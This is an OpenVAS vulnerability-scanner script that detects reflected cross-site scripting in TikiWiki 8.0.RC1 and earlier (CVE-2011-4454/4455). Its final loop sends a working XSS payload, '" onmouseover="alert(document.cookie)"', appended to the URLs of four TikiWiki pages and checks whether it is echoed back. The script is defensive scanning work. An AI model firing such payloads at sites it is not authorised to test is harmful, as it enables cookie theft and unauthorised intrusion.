###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tikiwiki_url_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# TikiWiki URL Multilple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "TikiWiki Version 8.0.RC1 and prior.";
tag_insight = "Multiple flaws are due to improper validation of input appended to
  the URL via pages 'tiki-remind_password.php','tiki-index.php',
  'tiki-login_scr.php', 'tiki-admin_system.php', 'tiki-pagehistory.php' and
  'tiki-removepage.php', That allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.";
tag_solution = "Upgrade TikiWiki to  8.1 or later
  For updates refer to http://info.tiki.org/";
tag_summary = "The host is running TikiWiki and is prone to multiple cross site
  scripting vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802353";
CPE = "cpe:/a:tikiwiki:tikiwiki";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4454", "CVE-2011-4455");
  script_bugtraq_id(50683);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-06 16:09:33 +0530 (Tue, 06 Dec 2011)");
  script_name("TikiWiki URL Multilple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46740/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107002/sa46740.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107082/INFOSERVE-ADV2011-01.txt");

  script_description(desc);
  script_summary("Check TikiWiki is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("TikiWiki/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Make list of vulnerable pages
pages = make_list("/tiki-index.php", "/tiki-admin_system.php",
                  "/tiki-pagehistory.php", "/tiki-login_scr.php");

foreach page (pages)
{
  url = dir + page + '/%22%20onmouseover=%22alert(document.cookie)%22';

  ## Construct the POST request
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Authorization: Basic bGFtcHA6\r\n\r\n");

  ## Try XSS Attack
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
     'php/" onmouseover="alert(document.cookie)"' >< res)
  {
    security_warning(port);
    exit(0);
  }
}
